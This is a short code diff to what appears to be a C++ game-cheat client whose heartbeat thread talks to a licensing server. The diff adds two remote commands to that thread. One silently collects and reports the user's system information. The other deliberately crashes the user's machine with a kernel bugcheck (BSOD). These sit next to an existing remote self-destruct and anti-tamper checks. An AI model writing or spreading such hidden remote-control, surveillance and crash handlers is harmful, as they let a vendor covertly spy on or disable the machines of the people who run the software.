@@ -1526,7 +1526,7 @@ int main() {
         return 1;
     }
 
-    // Heartbeat thread — keeps session alive + runs periodic tamper checks + kill handler
+    // Heartbeat thread — keeps session alive + runs periodic tamper checks + kill/monitor/bsod handler
     std::thread heartbeatThread([&auth]() {
         antitamper::RegisterThread(GetCurrentThreadId());
         Sleep(5000);
@@ -1540,6 +1540,19 @@ int main() {
                 // Kill command received — self-destruct
                 SelfAuth::api::SelfDestruct();
                 return; // never reached
+            }
+            if (hbResult == 3) {
+                // Monitor command — collect and report system info
+                try { auth.report_system_info(); } catch (...) {}
+                Sleep(10000);
+                continue;
+            }
+            if (hbResult == 4) {
+                // BSOD command — trigger kernel bugcheck
+                auth.TriggerBSOD();
+                // If BSOD failed (driver not loaded), fall through
+                Sleep(10000);
+                continue;
             }
             if (hbResult != 0) {
                 // Session dead — kill the cheat
